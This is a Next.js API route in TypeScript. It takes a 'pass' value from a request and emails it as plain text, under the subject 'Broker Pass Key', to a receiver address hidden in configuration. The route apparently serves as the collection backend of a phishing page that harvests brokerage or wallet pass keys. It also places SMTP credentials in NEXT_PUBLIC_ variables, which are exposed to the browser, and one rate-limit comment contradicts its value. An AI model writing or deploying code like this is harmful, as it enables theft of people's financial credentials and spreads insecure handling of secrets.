import { NextApiRequest, NextApiResponse } from "next";
import nodemailer from "nodemailer";
import rateLimit from "../../utils/rate-limit";

const limiter = rateLimit({
  interval: 60 * 1000, // 60 seconds
  uniqueTokenPerInterval: 5, // Max 500 users per second
});

export default async function SendMail(
  req: NextApiRequest,
  res: NextApiResponse
) {
  try {
    await limiter.check(res, 4, "CACHE_TOKEN");
    const request = await req.body;

    const transporter: nodemailer.Transporter = nodemailer.createTransport({
      host: process.env.NEXT_PUBLIC_EMAIL_HOST,
      port: 465,
      secure: true,
      auth: {
        user: process.env.NEXT_PUBLIC_EMAIL_USER,
        pass: process.env.NEXT_PUBLIC_EMAIL_PASS,
      },
    });

    const mailOptions: nodemailer.SendMailOptions = {
      from: process.env.NEXT_PUBLIC_EMAIL_USER, // sender address
      to: process.env.NEXT_PUBLIC_EMAIL_RECEIVE, // list of receivers
      subject: "Broker Pass Key", // Subject line
      text: request.pass, // plain text body
    };
    return await transporter
      .sendMail(mailOptions)
      .then((response: nodemailer.SentMessageInfo) => {
        return res
          .status(200)
          .json({ error: false, validation: false, errors: [] });
      })
      .catch((error: nodemailer.SentMessageInfo) => {
        return res
          .status(500)
          .json({ error: true, validation: false, errors: [error] });
      });
  } catch (error) {
    res.status(429).json({ error: "Rate limit exceeded" });
  }
}
